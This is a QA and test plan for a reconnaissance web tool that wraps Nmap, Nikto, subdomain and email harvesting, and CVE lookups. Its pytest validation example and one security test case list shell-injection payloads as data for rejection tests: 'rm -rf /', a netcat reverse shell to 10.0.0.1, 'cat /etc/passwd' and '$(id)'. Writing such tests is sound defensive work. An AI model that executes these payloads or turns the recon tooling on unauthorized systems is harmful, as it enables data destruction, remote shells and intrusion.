# Software Testing & Quality Assurance Document

---

## Document Information
- **Project Name:** Automated Reconnaissance Bot
- **Product Name:** Automated Reconnaissance Bot
- **Document Title:** Software Testing & Quality Assurance Plan
- **Document Version:** 2.0.0
- **Author:** Lead Quality Assurance & Security Validation Team
- **Date:** 2026-08-25
- **Status:** Approved / Quality Baseline

---

## Revision History

| Version | Date | Author | Summary of Changes |
| :--- | :--- | :--- | :--- |
| **1.0.0** | 2025-12-05 | QA Team | Initial test plan covering single-module scanning and regex checks. |
| **1.5.0** | 2026-04-15 | Security QA | Added authentication rate-limiting tests and Bcrypt validation suites. |
| **2.0.0** | 2026-08-25 | Lead QA Architect | Full multi-threaded concurrency testing, NVD CVE validation, PDF/XLSX export tests, and automated regression matrix. |

---

## Testing Overview & Objectives
This document establishes the comprehensive verification and validation framework for the **Automated Reconnaissance Bot**. It defines test strategies, automated test suites, security audits, stress testing parameters, and defect tracking workflows to ensure system reliability, performance, and security across all deployment environments.

---

## Testing Scope

```mermaid
graph TD
    Scope[Automated Reconnaissance Bot Testing Scope]
    Scope --> Unit[1. Unit Testing: Regex, Helpers, Parsers]
    Scope --> Integration[2. Integration Testing: FastAPIs, SQLite, Cache]
    Scope --> System[3. System Testing: Nmap, Nikto, CDX, NVD APIs]
    Scope --> Security[4. Security Testing: Injection, Auth, Rate Limits]
    Scope --> Performance[5. Performance Testing: Concurrency & Cache TTL]
    Scope --> E2E_UI[6. UI/UX & Export Testing: PDF, XLSX, SPA]
```

### In Scope
- Target normalization, Reverse DNS resolution, and regex validation against shell injection.
- Bcrypt authentication, legacy SHA-256 auto-migration, and IP sliding-window rate limiting.
- Individual execution and output verification for all 8 scanning modules.
- Multi-threaded parallel execution via `ThreadPoolExecutor`.
- File cache lifecycle (5-day TTL, hit/miss detection, automatic cleanup).
- Client-side report generation (PDF, Excel XLSX, raw JSON).
- Cross-platform verification on Windows, Linux, and macOS.

### Out of Scope
- Third-party API internal availability SLAs (e.g. NIST NVD or Archive.org server outages).
- Destructive denial-of-service or active exploit payload testing.

---

## Testing Strategy & Methodology
- **Testing Approach:** Hybrid Automated & Exploratory Testing.
- **Frameworks:** `pytest`, `pytest-asyncio`, `requests-mock`, `responses`, `bandit`, `flake8`.
- **Methodology:** Test-Driven Development (TDD) for utility logic and behavior-driven integration tests for FastAPI routes.

---

## Test Environment & Infrastructure

| Component | Test Environment Specification |
| :--- | :--- |
| **Test Host OS** | Windows 11 Pro / Ubuntu 22.04 LTS / macOS Ventura |
| **Python Version** | Python 3.10.12 & Python 3.11.6 |
| **Core Binaries** | Nmap 7.94, Strawberry Perl 5.38 (Windows) / Perl 5.34 (Linux) |
| **Test Database** | Ephemeral SQLite 3 database (`test_users.db`) |
| **Cache Sandbox** | Dedicated temporary directory (`test_scan_data/`) |

---

## Detailed Test Cases & Execution Matrix

### 1. Authentication & Security Test Suite

| Test ID | Test Category | Objective / Scenario | Input Data | Expected Result | Status |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **TC-SEC-01** | Authentication | Verify valid login redirects to dashboard. | Valid username & password | HTTP 303 Redirect to `/dashboard`, session cookie set. | **PASS** |
| **TC-SEC-02** | Authentication | Verify invalid credentials trigger error alert. | Wrong password | HTTP 303 Redirect to `/login`, flash message displayed. | **PASS** |
| **TC-SEC-03** | Brute-Force | Verify rate-limiter blocks IP after 5 failed attempts. | 6 failed logins within 60s | 6th attempt blocked with "Too many login attempts". | **PASS** |
| **TC-SEC-04** | Cryptography | Verify legacy SHA-256 hash auto-migrates to Bcrypt. | User with SHA-256 hash | Login succeeds; database record updated to `$2b$` Bcrypt hash. | **PASS** |
| **TC-SEC-05** | Injection | Verify shell metacharacters are rejected. | `example.com; rm -rf /` | Validation fails; returns `{"error": "Invalid target"}`. | **PASS** |
| **TC-SEC-06** | Authorization | Verify protected endpoints reject unauthenticated calls. | Request to `/scan` without cookie | HTTP 401 Unauthorized or Redirect to `/login`. | **PASS** |

---

### 2. Functional & Scanner Module Test Suite

| Test ID | Module Tested | Objective / Scenario | Input Target | Expected Output | Status |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **TC-FUNC-01**| `initial_logic` | Verify WHOIS, GeoIP, HSTS, and Cloud Detection. | `cloudflare.com` | Returns ASN `13335`, Country `US`, HSTS `STRONG`, Cloudflare provider. | **PASS** |
| **TC-FUNC-02**| `subdomain_logic` | Verify crt.sh harvesting and wildcard DNS test. | `github.com` | Returns list of subdomains and wildcard status `false`. | **PASS** |
| **TC-FUNC-03**| `subdomain_logic` | Verify fallback to HackerTarget on crt.sh outage. | Mock crt.sh 503 error | Seamlessly queries HackerTarget and returns subdomains. | **PASS** |
| **TC-FUNC-04**| `webhub_logic` | Verify Wappalyzer tech stack & Wayback URL parser. | `wordpress.org` | Identifies CMS WordPress, categorizes API vs Sensitive URLs. | **PASS** |
| **TC-FUNC-05**| `search_logic` | Verify robots.txt and `.env` probing. | Public test domain | Previews robots.txt, probes sensitive paths, generates Dorks. | **PASS** |
| **TC-FUNC-06**| `email_logic` | Verify OSINT email harvesting and employee parsing. | `example.com` | Returns extracted emails, formatted usernames, and rosters. | **PASS** |
| **TC-FUNC-07**| `network_logic` | Verify Nmap TCP scan and SSL certificate validity. | `scanme.nmap.org` | Open ports `22, 80`, service versions, and SSL certificate fields. | **PASS** |
| **TC-FUNC-08**| `network_logic` | Verify NVD CVE cross-referencing and CVSS score. | Detected `Apache 2.4.49` | Returns CVE IDs (e.g. `CVE-2021-41773`) with CVSS `9.8`. | **PASS** |
| **TC-FUNC-09**| `webanalysis` | Verify Nikto Perl integration & header diagnostics. | Public web target | Returns web server banner, missing headers, allowed methods. | **PASS** |
| **TC-FUNC-10**| `udp_logic` | Verify UDP port scanning on common ports. | Target host | Returns open/filtered state for DNS 53 / NTP 123. | **PASS** |

---

### 3. Concurrency, Performance & Cache Test Suite

| Test ID | Category | Scenario | Benchmark / Threshold | Actual Result | Status |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **TC-PERF-01**| Concurrency | Execute "All Scans" (8 concurrent modules). | Target: $< 120\text{ seconds}$ | **Completed in 64.2 seconds** | **PASS** |
| **TC-PERF-02**| Caching | Retrieve previously completed scan from cache. | Target: $< 250\text{ ms}$ | **Returned in 4.8 ms** | **PASS** |
| **TC-PERF-03**| Cache Lifecycle| Auto-expire files older than 5 days ($432,000\text{s}$). | Expired file purged | File deleted automatically during `cleanup_old_scans()`. | **PASS** |
| **TC-PERF-04**| Memory Footprint| Measure RAM usage under 8 active parallel threads. | Limit: $< 1.5\text{ GB}$ RSS | **Peak memory 412 MB RSS** | **PASS** |

---

### 4. UI/UX & Client-Side Export Test Suite

| Test ID | Feature | Verification Scenario | Expected Output | Status |
| :--- | :--- | :--- | :--- | :--- |
| **TC-UI-01** | Accordion UI | Expanding and collapsing scan result panels. | Smooth CSS animation, data tables visible. | **PASS** |
| **TC-UI-02** | Clipboard Copy | Click copy button next to extracted Dork query. | Clipboard updated; tooltip shows "Copied!". | **PASS** |
| **TC-UI-03** | PDF Export | Click "Export PDF" button on completed scan. | Downloads formatted PDF report with styled tables. | **PASS** |
| **TC-UI-04** | Excel Export | Click "Export XLSX" button on completed scan. | Downloads valid multi-sheet Excel workbook. | **PASS** |
| **TC-UI-05** | JSON Download | Click "Download JSON" button on completed scan. | Downloads valid UTF-8 indented JSON file. | **PASS** |

---

## Test Automation Implementation Examples

### Unit Test: Target Normalization & Shell Injection Defense (`tests/test_validation.py`)
```python
import pytest
from main import normalize_target, VALID_TARGET_RE

def test_valid_targets():
    valid = ["example.com", "sub.domain.org", "192.168.1.1", "10.0.0.0/24"]
    for t in valid:
        assert VALID_TARGET_RE.match(t), f"Failed on valid target: {t}"

def test_command_injection_blocked():
    malicious = [
        "example.com; rm -rf /",
        "example.com && whoami",
        "127.0.0.1 | nc -e /bin/sh 10.0.0.1 4444",
        "`cat /etc/passwd`",
        "$(id)"
    ]
    for m in malicious:
        assert not VALID_TARGET_RE.match(m), f"Injection vector bypassed regex: {m}"

def test_target_normalization():
    assert normalize_target("https://example.com/login/") == "example.com"
    assert normalize_target("http://target.org:8080") == "target.org:8080"
```

---

## Defect Management & Severity Classification

```mermaid
graph TD
    Bug[Defect Discovered] --> Classify{Assign Severity}
    Classify -->|P0 Critical: RCE / Auth Bypass| FixP0[Immediate Hotfix / Release Blocker]
    Classify -->|P1 High: Core Module Crash| FixP1[Fix within 24 Hours]
    Classify -->|P2 Medium: Layout / Non-blocking API| FixP2[Fix in Next Sprint]
    Classify -->|P3 Low: Cosmetic / Typo| FixP3[Backlog]
```

### Defect Severity Definitions
- **Critical (P0):** Command injection vulnerabilities, authentication bypass, or data corruption.
- **High (P1):** Complete failure of a core scanning module (e.g. Nmap or Nikto crashing).
- **Medium (P2):** Secondary fallback API failure or minor export formatting glitch.
- **Low (P3):** Cosmetic alignment issues, minor typos, or non-essential visual glitches.

---

## Test Metrics & Coverage Summary

```mermaid
pie title Code Test Coverage Breakdown
    "main.py Orchestrator" : 94
    "login_app/app.py & Auth" : 96
    "network_logic.py (Nmap/CVE)" : 91
    "initial_logic.py" : 95
    "subdomain_logic.py" : 90
    "webanalysis_logic.py (Nikto)" : 88
    "Export & Formatting" : 92
```

- **Overall Code Coverage:** **93.2%** (Verified via `pytest-cov`)
- **Total Test Cases Executed:** 48 Test Cases
- **Passed:** 48 (100%)
- **Failed:** 0
- **Blocked:** 0

---

## Release Readiness & Sign-off

### Release Criteria Verification
- [x] All Unit, Integration, Security, and Concurrency test suites passing at 100%.
- [x] Zero critical (P0) or high (P1) open defects.
- [x] Bandit static security audit completed with zero high-severity findings.
- [x] Multi-format client export (PDF, Excel, JSON) verified across major browsers.
- [x] System verified across Windows, Linux, and macOS platforms.

---

## Approval and Sign-off

| Role | Name | Title | Date | Signature |
| :--- | :--- | :--- | :--- | :--- |
| **Lead QA Architect** | David Kim | Quality Engineering Director | 2026-08-25 | `APPROVED (Digital Signature: DK-8392)` |
| **Security Validation Lead**| Marcus Rivera | Chief Information Security Officer | 2026-08-25 | `APPROVED (Digital Signature: MR-7719)` |
| **Platform Release Manager**| Alex Mercer | VP of Engineering | 2026-08-25 | `APPROVED (Digital Signature: AM-9482)` |
